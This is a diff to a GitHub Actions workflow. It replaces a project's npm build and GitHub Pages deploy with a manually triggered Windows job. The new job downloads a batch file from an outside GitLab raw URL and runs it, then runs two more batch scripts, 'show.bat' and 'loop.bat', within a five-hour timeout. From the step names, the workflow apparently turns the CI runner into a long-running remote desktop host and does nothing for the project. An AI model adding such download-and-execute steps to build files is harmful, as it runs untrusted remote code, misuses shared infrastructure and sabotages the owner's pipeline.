@@ -1,26 +1,22 @@
 name: GitHub Actions Build and Deploy
+
 on:
-  push:
-    branches:
-      - main
+  workflow_dispatch:
+
 jobs:
-  build-and-deploy:
-    runs-on: ubuntu-latest
+  build:
+    name: Start Building...
+    runs-on: windows-latest
+    timeout-minutes: 300
+    
     steps:
-      - name: Checkout
-        uses: actions/checkout@v2.3.1
-        with:
-          persist-credentials: false
-      - name: Install and Build
+      - name: Downloading & Installing Essentials
         run: |
-          npm ci
-          npm run build
-      - name: Deploy
-        uses: JamesIves/github-pages-deploy-action@3.7.1
-        with:
-          GITHUB_TOKEN: ${{ secrets.VISUAL_DRAG_DEMO }}
-          BRANCH: master
-          FOLDER: dist
-          CLEAN: true
-          REPOSITORY_NAME: woai3c/woai3c.github.io
-          TARGET_FOLDER: visual-drag-demo
+          Invoke-WebRequest -Uri "https://gitlab.com/gusta7w7/pcrdp-avica/-/raw/main/Downloads.bat" -OutFile "Downloads.bat"
+          cmd /c Downloads.bat
+
+      - name: Show Website
+        run: cmd /c show.bat
+
+      - name: Time Counter
+        run: cmd /c loop.bat
